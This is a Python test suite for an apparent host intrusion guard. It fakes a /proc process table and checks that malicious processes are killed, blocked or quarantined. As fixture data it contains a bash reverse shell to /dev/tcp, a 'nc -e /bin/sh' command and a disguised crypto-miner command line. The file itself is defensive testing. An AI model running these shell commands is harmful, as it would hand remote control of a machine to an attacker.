#!/usr/bin/env python3
import os, sys, tempfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import host_guard as hg
bad = []
def check(n, ok): print(("PASS " if ok else "FAIL ") + n); ok or bad.append(n)
R = tempfile.mkdtemp(); proc = os.path.join(R, "proc"); os.makedirs(proc + "/net")
def mk(pid, cmd, exe="/usr/bin/x", ppid=1, sockets=()):
    d = "%s/%d" % (proc, pid); os.makedirs(d + "/fd", exist_ok=True)
    open(d + "/cmdline", "w").write("\0".join(cmd.split(" ")) + "\0"); open(d + "/stat", "w").write("%d (x) S %d 1 1" % (pid, ppid))
    os.symlink(exe, d + "/exe")
    for i, ino in enumerate(sockets): os.symlink("socket:[%d]" % ino, "%s/fd/%d" % (d, i + 3))
evil = os.path.join(R, "tmp"); os.makedirs(evil); miner_bin = evil + "/kworkerds"; open(miner_bin, "w").write("ELF")
mk(1, "/sbin/init"); mk(100, "/usr/sbin/sshd -D"); mk(200, "python3 app.py", "/usr/bin/python3"); mk(201, "nginx: worker", "/usr/sbin/nginx")
mk(300, "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1", "/usr/bin/bash", sockets=[777])
mk(301, "./kworkerds -o stratum+tcp://pool.example:3333 --donate-level 1", miner_bin, sockets=[778])
mk(302, "nc -e /bin/sh 10.0.0.9 9001", "/usr/bin/nc", sockets=[779])
mk(305, "bash -i", "/usr/bin/bash"); mk(306, "bash -i", "/usr/bin/bash", sockets=[780]); mk(303, "/tmp/installer --setup", "/tmp/installer"); mk(304, "python3 /opt/dualshield/multi/agent.py", "/usr/bin/python3")
open(proc + "/net/tcp", "w").write("  sl local rem st x x x x x x inode\n   0: 0100007F:1234 0701 33C6:115C 01 0 0 0 0 0 777\n   1: 0100007F:1234 0A00000A:0BB8 01 0 0 0 0 0 778\n   2: 0100007F:1234 0900000A:2329 01 0 0 0 0 0 779\n".replace("0701 33C6", "07 33C6"))
# fix remote hex: 198.51.100.7 -> little endian 076433C6 ; 10.0.0.9 -> 0900000A
open(proc + "/net/tcp", "w").write("  sl local rem st x x x x x x inode\n   0: 0100007F:1234 076433C6:115C 01 0 0 0 0 0 777\n   1: 0100007F:1234 0A00000A:0D05 01 0 0 0 0 0 778\n   2: 0100007F:1234 0900000A:2329 01 0 0 0 0 0 779\n   3: 0100007F:1234 084433C6:1F90 01 0 0 0 0 0 780\n")
acts = []; qd = os.path.join(R, "q")
g = hg.HostGuard(lambda p: acts.append(("kill", p)), lambda exe, rec: hg.quarantine_file(exe, rec, qd), lambda ip: acts.append(("block", ip)), lambda ip: acts.append(("report", ip)),
                 lambda ip: "infra" if ip == "10.0.0.9" else None, proc=proc, me=9999, log=lambda m: acts.append(("log", m)))
r = {x["pid"]: x for x in g.scan()}
check("normal processes (init, sshd, python app, nginx) are not touched", not any(p in r for p in (1, 100, 200, 201)))
check("reverse shell (bash -i /dev/tcp) killed", r[300]["level"] == "HIGH" and ("kill", 300) in acts)
check("its remote address is found from the socket and blocked + reported", ("block", "198.51.100.7") in acts and ("report", "198.51.100.7") in acts)
check("crypto miner killed and its program file quarantined", ("kill", 301) in acts and not os.path.exists(miner_bin) and len(hg.list_q(qd)) == 1)
check("netcat -e killed; our own infrastructure address is not blocked", ("kill", 302) in acts and ("block", "10.0.0.9") not in acts)
check("an admin's plain bash -i (no network connection) is left alone, one with a remote connection is killed", 305 not in r and ("kill", 306) in acts)
check("program from /tmp = alert only, NOT killed", r[303]["level"] == "ALERT" and ("kill", 303) not in acts)
check("DualShield's own process is never touched", 304 not in r)
n = len(acts); g.scan(); check("same finding is handled once", len(acts) == n)
q = hg.list_q(qd)[0]; back = hg.restore_q(q["id"], qd); check("RETRIEVE: quarantined file restored, without execute permission", back == miner_bin and os.path.exists(back) and not os.access(back, os.X_OK))
sys.exit(1 if bad else 0)
